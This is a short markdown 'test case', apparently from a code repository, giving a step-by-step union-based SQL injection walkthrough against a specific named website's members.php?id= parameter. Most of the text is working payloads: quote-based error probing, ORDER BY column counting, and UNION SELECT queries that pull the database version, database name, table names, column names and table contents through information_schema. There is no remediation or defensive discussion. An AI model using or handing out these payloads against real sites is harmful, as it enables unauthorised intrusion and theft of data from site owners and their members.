# Test Case
## How SQL Injection Works?
The types of attacks that can be performed using SQL injection vary depending on the type of database engine.
Website Name: “ASFAA MEMBERS”
* Step 01) Search unprotected or unsecure website. We will scan for vulnerable SQL sites
Having;  php?id=1
![image](https://user-images.githubusercontent.com/61589430/204821259-4ba31b79-0cef-4257-ae25-b9ac46d8a0c0.png)

 
* Step 02) Identify vulnerability
By adding “ ‘ ” at the end of URL
If database error occurs this means vulnerability is present.
COMMAND:  http://www.asfaa.org/members.php?id=1’


* Step 3) Find number of columns in database
Command:  http://www.asfaa.org/members.php?id=1 order by 1
If no change in site, it means column 1 is exist in database of this site.


* Step 4) Check until you will find exact number of columns
Command:  http://www.asfaa.org/members.php?id=1 order by 5
Warning occur at order by 5 means site has only 4 columns
 
* Step 5) Total number of columns are 4
 

* Step 6) Find open door to get information
Command:  http://www.asfaa.org/members.php?id=-1 union select 1,2,3,4
 
* Step 7) Find version of Database
Command:  -1 union select 1,@@version,3,4
 
* Step 8) Find the name of database.
Command: -1 union select 1,group_concat(database()),3,4
 
* Step 9) Find name of Tables in database
Command:  -1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()
 
* Step 10) Find columns name in a table
Command:  -1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name="atelier"
 
* Step 11) Information inside Columns (entries)
Commands: -1 union select 1,group_concat(id,0x3a,categoria),3,4 from atelier

 
